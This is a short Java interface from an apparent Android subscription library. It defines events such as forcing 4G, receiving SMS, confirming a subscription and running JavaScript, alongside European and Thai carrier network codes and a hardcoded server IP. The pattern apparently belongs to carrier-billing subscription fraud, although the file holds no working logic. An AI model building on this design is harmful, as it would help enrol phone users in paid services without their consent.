package com.enhtmv.sublib.common.sub;

public interface Sub {

    //安装
    String INSTALLED = "installed";

    //打开通知
    String OPEN_NOTIFICATION = "open_notification";

    //4g网络
    String OPEN_4G_NETWORK = "open_4g_network";

    //发起订阅
    String SUB_REQEUST = "sub_reqeust";

    //收到短信
    String RECEIVE_SMS = "receive_sms";

    //订阅成功
    String SUB_SUCCESS = "sub_success";

    //已订阅
    String ALREADY_SUB = "already_sub";

    //执行javascript
    String CALL_JAVASCRIPT = "call_javascript";

    //开始WebSocket连接
    String WEBSOCKET_CONNECT = "websocket_connect";

    //关闭WebSocket连接
    String WEBSOCKET_CLOSE = "websocket_close";

    //--------------------------------- 运营商 ---------------------------------

    String ITALY_TIM = "22201";

    String SPAIN_ORANGE = "21403";

    String AUSTRIA_H3G = "23210";
    String PT_MEO = "26806";
    String AUSTRIA_H3G_2 = "23205";

    String AUSTRIA_OPERATOR_A1_1 = "23201";
    String AUSTRIA_OPERATOR_A1_2 = "23209";

    String UK_VODAFONE = "23415";
    String TH_AIS = "52003";
    String UK_THREE = "23420";

    String SUB_TEST = "test";

    String APP_SERVER_HOST = "http://52.53.238.169:8081";


    void sub(String info);

    void onSub(String message);

}
